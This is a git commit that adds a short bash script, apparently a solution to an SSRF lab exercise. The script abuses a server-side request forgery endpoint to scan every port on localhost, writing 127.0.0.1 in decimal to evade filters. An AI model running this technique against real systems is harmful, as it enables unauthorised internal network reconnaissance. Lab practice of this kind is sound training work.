966786a2efbd435882e2e740d4cf67cd77b86f4a
Alvin Smith <alvinsmith.nz@gmail.com>
2020-09-13 21:08:25 +1200

    Add SSRF-2

---
+++ SSRF-2/intruder.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+for x in {1..65535};
+    do cmd=$(curl -so /dev/null http://10.10.128.65:8000/attack?url=http://2130706433:${x} -w '%{size_download}');
+    if [ $cmd != 1045 ]; then
+        echo "Open port: $x"
+    fi
+done
+
+# http://[2130706433]:3306 is reachable
+# https://stackoverflow.com/questions/9190190/how-to-use-curl-to-compare-the-size-of-the-page-with-deflate-enabled-and-without
